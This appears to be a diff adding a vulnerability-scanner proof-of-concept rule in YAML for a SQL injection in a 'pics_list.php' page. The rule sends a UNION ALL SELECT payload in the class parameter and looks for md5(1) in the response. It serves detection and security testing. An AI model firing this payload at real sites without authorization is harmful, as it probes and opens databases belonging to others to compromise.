@@ -1,0 +1,13 @@
+name: poc-yaml-xinrongSQL
+rules:
+  - method: GET
+    path: >-
+      /pics_list.php?class=-7119%20UNION%20ALL%20SELECT%20NULL,md5(1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20iaOh
+    headers:
+      User-Agent: >-
+        Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+        like Gecko) Chrome/76.0.3809.132 Safari/537.36
+    follow_redirects: true
+    expression: |
+      status==200
+    search: c4ca4238a0b923820dcc509a6f75849b
